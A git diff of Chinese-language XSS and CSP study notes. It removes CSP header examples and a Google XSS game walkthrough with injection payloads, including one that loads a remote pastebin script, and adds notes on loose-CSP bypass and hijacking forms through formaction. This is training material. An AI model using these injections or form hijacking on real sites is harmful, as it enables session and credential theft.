@@ -519,6 +519,8 @@ exp:
 
 ## csp
 
+
+
 Content Security Policy （CSP）内容安全策略，是一个附加的安全层，有助于检测并缓解某些类型的攻击，包括跨站脚本（XSS）和数据注入攻击。
 
 CSP的特点就是他是在浏览器层面做的防护，是和同源策略同一级别，除非浏览器本身出现漏洞，否则不可能从机制上绕过。
@@ -539,65 +541,7 @@ https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Polic
 
 
 
-#### 示例 1
 
-
-
-一个网站管理者想要所有内容均来自站点的同一个源 (不包括其子域名)
-
-```html
-Content-Security-Policy: default-src 'self'
-```
-
-#### 示例 2
-
-
-
-一个网站管理者允许内容来自信任的域名及其子域名 (域名不必须与CSP设置所在的域名相同)
-
-```html
-Content-Security-Policy: default-src 'self' *.trusted.com
-```
-
-#### 示例 3
-
-
-
-一个网站管理者允许网页应用的用户在他们自己的内容中包含来自任何源的图片, 但是限制音频或视频需从信任的资源提供者(获得)，所有脚本必须从特定主机服务器获取可信的代码.
-
-```html
-Content-Security-Policy: default-src 'self'; img-src *; media-src media1.com media2.com; script-src userscripts.example.com
-```
-
-在这里，各种内容默认仅允许从文档所在的源获取, 但存在如下例外:
-
-- 图片可以从任何地方加载(注意 "*" 通配符)。
-- 多媒体文件仅允许从 media1.com 和 media2.com 加载(不允许从这些站点的子域名)。
-- 可运行脚本仅允许来自于userscripts.example.com。
-
-#### 示例 4
-
-
-
-一个线上银行网站的管理者想要确保网站的所有内容都要通过SSL方式获取，以避免攻击者窃听用户发出的请求。
-
-```html
-Content-Security-Policy: default-src https://onlinebanking.jumbobank.com
-```
-
-该服务器仅允许通过HTTPS方式并仅从onlinebanking.jumbobank.com域名来访问文档。
-
-#### 示例 5
-
-
-
- 一个在线邮箱的管理者想要允许在邮件里包含HTML，同样图片允许从任何地方加载，但不允许JavaScript或者其他潜在的危险内容(从任意位置加载)。
-
-```html
-Content-Security-Policy: default-src 'self' *.mailsite.com; img-src *
-```
-
- 注意这个示例并未指定[`script-src`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)。在此CSP示例中，站点通过 [`default-src`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src) 指令的对其进行配置，这也同样意味着脚本文件仅允许从原始服务器获取。
 
 ### 绕过
 
@@ -638,6 +582,12 @@ Static/302.php
 ```
 <script src="static/302.php?url=upload/test.jpg">
 ```
+
+
+
+
+
+
 
 
 
@@ -755,6 +705,33 @@ Content-Security-Policy: default-src 'self'; connect-src *;
 
 测试了下好像已经不行了，没有 CSP 头也不行
 
+#### csp策略不够严格导致的绕过
+
+```html
+<script></script>
+<frame></frame>
+<object></object>
+
+```
+
+
+
+### csp常用网站
+
+ https://csp-evaluator.withgoogle.com/  可以查看csp策略的安全等级
+
+
+
+## 劫持form
+
+如何劫持呢？利用两个 HTML5 的有趣属性：
+
+> https://www.w3school.com.cn/tags/att_input_formaction.asp
+>
+> https://www.w3school.com.cn/tags/att_input_form.asp
+
+ 我们可以利用留言功能插入一个在表单之外的 input 标签，再利用这两个属性来劫持表单
+
 ## xss工具
 
 xss-proxy,xssshell,attackapi,anehta,avws
@@ -769,96 +746,3 @@ https://github.com/Ph0rse/Awesome-XSS
 
 先知xss挑战赛 以及Google'xss挑战有能力的话把这两个搞下。
 
-## google xss
-
-### level1
-
-`<script>alert()</script>`
-
-### level 2
-
-`<img src="aaaaaaaa.jpg" onerror="alert()"></img>`
-
-### level 3
-
-代码审计发现
-
-```javascript
-html += "<img src='/static/level3/cloud" + num + ".jpg' />";
-```
-
-
-
-```javascript
-#' onerror="alert()" '#1
-```
-
-### level 4
-
-关键代码
-
-```python
-self.render_template('timer.html', { 'timer' : timer })
-```
-
-测试发现过滤了,`(,"`无法闭合
-
-于是构造
-
-`https://xss-game.appspot.com/level4/frame?timer=1'%2balert()%2b'1`
-
-### level 5
-
-`https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert()`
-
-关键代码:`<a href="{{ next }}">Next >></a>`
-
-
-
-### level 6
-
-
-
-关键代码:
-
-```javascript
-    function includeGadget(url) {
-      var scriptEl = document.createElement('script');
- 
-      // This will totally prevent us from loading evil URLs!
-      if (url.match(/^https?:\/\//)) {
-        setInnerText(document.getElementById("log"),
-          "Sorry, cannot load a URL containing \"http\".");
-        return;
-      }
- 
-      // Load this awesome gadget
-      scriptEl.src = url;
- 
-      // Show log messages
-      scriptEl.onload = function() { 
-        setInnerText(document.getElementById("log"),  
-          "Loaded gadget from " + url);
-      }
-      scriptEl.onerror = function() { 
-        setInnerText(document.getElementById("log"),  
-          "Couldn't load gadget from " + url);
-      }
- 
-      document.head.appendChild(scriptEl);
-    }
-```
-
-
-
-网页会根据#号后面的内容创建script标签
-
-但是过滤了http和https为开始的url
-
-但是当我们输入//xxx的时候,浏览器会把当前网址的协议当做这个网址的协议,于是我们成功绕过过滤
-
-`//pastebin.com/raw/0eAVjVxh`
-
-
-
-这一题data协议也能做
